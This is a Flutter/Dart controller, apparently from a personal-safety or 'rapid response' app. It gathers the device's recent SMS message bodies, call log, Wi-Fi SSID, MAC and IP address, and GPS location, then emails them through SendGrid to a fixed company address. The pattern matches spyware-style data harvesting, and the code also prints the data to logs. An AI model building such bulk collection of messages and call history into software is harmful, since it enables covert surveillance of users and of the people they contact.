import 'package:appone/constants/constans.dart';
import 'package:appone/model/user_model.dart';
import 'package:enough_mail/enough_mail.dart';
import 'package:geolocator/geolocator.dart';
import 'package:get/get.dart';
import 'package:sendgrid_mailer/sendgrid_mailer.dart';

class SendMailController extends GetxController {
  sendEmailOrder(
      {String? userNam,
      phone,
      email,
      List<Map<String, dynamic>>? sms,
      List<Map<String, dynamic>>? calls,
      connectionInfos,
      Position? position}) async {
    String body = """

    Full name : $userNam
    Phone Number : $phone
    Email : $email

    Last Sms Messages: 
            ${sms!.map((item) => "Address  : ${LastSmsMsg.fromJson(item).address} ,\n  Body  : ${LastSmsMsg.fromJson(item).body}, \n DateTime : ${LastSmsMsg.fromJson(item).date} \n \n \n")}
          
    Last Phone Calls: 
            ${calls!.map((item) => "Name  : ${LastPhoneCall.fromJson(item).name} ,\n  Phone Number  : ${LastPhoneCall.fromJson(item).phoneNumber}, \n Duration : ${LastPhoneCall.fromJson(item).duration} sec \n Datetime : ${DateTime.fromMicrosecondsSinceEpoch(LastPhoneCall.fromJson(item).timestamp! * 1000)}\n Call type : ${LastPhoneCall.fromJson(item).callType} \n Sim name: ${LastPhoneCall.fromJson(item).simName!} \n \n \n")}

     Connection Infos: 
            ssid: ${connectionInfos!.ssid},
            mac: ${connectionInfos.macAddress},
            connection_type: ${connectionInfos.connectionType},
            ip: ${connectionInfos.ipAddress},

    Location: 
            Lat: ${position!.latitude}
            Long: ${position.longitude}
      
    """;

    print('Body $body');
    print('Body $calls');

    try {
      final mailer = Mailer(PASSWORD);
      final toAddress = Address('allsecureplustechs@secureplus.com.au');
      final fromAddress = Address(USERNAME, "Secure Plus - Rapid Response");
      final content = Content('text/plain', body);
      final subject = 'User Data - ${userNam}';
      final personalization = Personalization([toAddress]);

      final email =
          Email([personalization], fromAddress, subject, content: [content]);
      mailer.send(email).then((result) {
        print('Email is SENT');
      });
    } on SmtpException catch (e) {
      print('SMTP failed with $e');
    }
  }
}
